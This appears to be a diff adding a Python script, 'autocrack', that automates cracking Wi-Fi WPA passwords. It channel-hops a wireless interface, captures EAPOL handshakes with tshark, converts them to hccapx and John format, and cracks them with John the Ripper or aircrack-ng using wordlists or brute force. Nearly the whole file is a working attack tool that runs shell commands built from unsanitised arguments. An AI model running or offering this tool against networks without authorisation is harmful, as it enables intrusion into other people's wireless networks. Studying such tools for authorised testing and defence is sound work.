@@ -1,0 +1,142 @@
+#!/usr/bin/python3
+#
+# autocrack script
+# │
+# ├─ handshake.cap ──> aircrack-ng
+# │
+# └─ scanner_tshark ──> handshake.cap ──> handshake.hccapx ──> jhon
+#
+#Imports
+import argparse
+import os
+import sys
+import time
+from threading import Thread
+
+#Argparse formatter
+class SmartFormatter(argparse.HelpFormatter):
+        def _split_lines(self, text, width):
+                if text.startswith('R|'):
+                        return text[2:].splitlines()
+                return argparse.HelpFormatter._split_lines(self, text, width)
+
+#Variables
+verb = 0
+sys.tracebacklimit=0
+
+#Arguments
+parser = argparse.ArgumentParser(formatter_class=SmartFormatter)
+parser.add_argument("attack_mode", choices={'A', 'B'},help="R|Select between attack modes:\n"
+"	A) Scan with tshark until EAPOL package is found, then, crack_the_hash with John The Ripper\n"
+"	B) Receive a <.cap> file and crack it with aircrack-ng (recommended for airodump-ng scans!)")
+parser.add_argument("-i", "--interface", help="R|Interface that will perform the scan (only for attack mode A)")
+parser.add_argument("-r", "--read", help="R|Read a <.cap> file to retrieve the EAPOL hash and crack it")
+parser.add_argument("-w", "--wordlist", help="R|Wordlist to use:\n"
+"	Attack mode A: If no wordlist is specified, John will perform an incremental bruteforce\n"
+"	Attack mode B: Mandatory argument because of aircrack-ng")
+parser.add_argument("-c", "--channel", help="R|Set channel for the attack mode A scan. If not set, channel hopping will be performed")
+parser.add_argument("-a", "--autostop", help="R|Tshark autostop time (in seconds), default is 30", default=30)
+parser.add_argument("-v", help="Verbose mode", action="store_true")
+args = parser.parse_args()
+attack = args.attack_mode
+
+#Arg_checker
+if attack == "A":
+	if args.interface is None:
+		sys.exit("Argument -i/--interface must be defined with this attack mode!")
+	else:
+		intf = args.interface
+
+if args.v is True:
+	verb = 1
+
+#Var update
+
+
+#Functions
+def channel_hop():
+	ch = 1
+	while True:
+		os.system(f"iwconfig {intf} channel {ch}")
+		ch = ch % 14 + 1
+		time.sleep(0.25)
+
+def A_class_attack():
+	if verb == 1:
+		print("[*] Starting tshark scan on interface %s..."% intf)
+		print("[*] Scan will last %s seconds"% args.autostop)
+		print("[*] Command sent is 'tshark -i %s -F pcap -w scan.pcap -a duration:%s'"% (intf, args.autostop))
+		time.sleep(3)
+	#print("Press CTRL-C to stop the scan")
+	scan_cmd = ("tshark -i %s -F pcap -w scan.pcap -a duration:%s"% (intf, args.autostop))
+	os.system(scan_cmd)
+	print("")
+	print("[!] Scan complete")
+	if verb ==1:
+		print("[*] Captured networks were:")
+		os.system("tshark -r scan.pcap -T fields -e wlan.ssid | sort | uniq")
+	print("")
+	print("[*] Formatting for subtypes:\n0x00, 0x02, 0x04, 0x05, 0x08 and EAPOL")
+	time.sleep(1)
+	format = ('tshark -r scan.pcap -Y "(wlan.fc.type_subtype == 0x00 || wlan.fc.type_subtype == 0x02 || wlan.fc.type_subtype == 0x04 || wlan.fc.type_subtype == 0x05 || wlan.fc.type_subtype == 0x08 || eapol)" -F pcap -w scan.pcap')
+	#os.system(format)
+	if verb == 1:
+		print("[*] Scan formatted correctly, file scan.pcap was rewritten")
+		print("")
+	print("[*] Moving to hccapx format...")
+	os.system("cap2hccapx.bin scan.pcap scan.hccapx")
+	print("[+] Preparing to crack_the_hash")
+	os.system("hccapx2john scan.hccapx > hash")
+
+def john_crack():
+	if args.wordlist is not None:
+		path_to_wordlist = args.wordlist
+		wordlist = 1
+	else:
+		wordlist = 0
+	if wordlist == 1:
+		john_wordlist_cmd = ("john --wordlist=%s hash"% (path_to_wordlist))
+		os.system(john_wordlist_cmd)
+	else:
+		john_cmd = ("john --incremental --log-stderr -2='4321abcdefghijklmnopqrstuvwxyz' --min-length=8 --max-length=8 --mask='?2' hash")
+		os.system(john_cmd)
+
+def aircrack_func():
+	if args.read is None:
+		sys.exit("[!] File must be specified with -r!")
+	else:
+		file = args.read
+	extension = file.split(".")
+	extension = extension[-1]
+	if extension == "cap":
+		if args.wordlist is not None:
+			os.system(f"aircrack-ng -w {args.wordlist} {file}")
+		else:
+			os.system(f"aircrack-ng -w $(locate rockyou.txt) {file}")
+	elif (extension == "pcap" or extension == "pcapng" or extension == "hccap" or extension == "hccapx"):
+		if args.wordlist is not None:
+			os.system(f"aircrack-ng -w {args.wordlist} {file}")
+		else:
+			os.system(f"aircrack-ng -w $(locate rockyou.txt) {file}")
+	else:
+		print("Allowed extensions:\ncap, pcap, pcapng, hccap, hccapx")
+		sys.exit("[!] File does not contain one of the above extensions")
+
+#Script
+if attack == "A":
+	if args.channel is None:
+		channel_hopper = Thread(target=channel_hop)
+		channel_hopper.daemon = True
+		channel_hopper.start()
+	else:
+		ch = args.channel
+		os.system(f"iwconfig {intf} channel {ch}")
+	if args.read is None:
+		A_class_attack()
+		john_crack()
+	else:
+		os.system(f"cap2hccapx.bin {args.read} file.hccapx")
+		os.system(f"hccapx2john file.hccapx > hash")
+		john_crack()
+else:
+	aircrack_func()
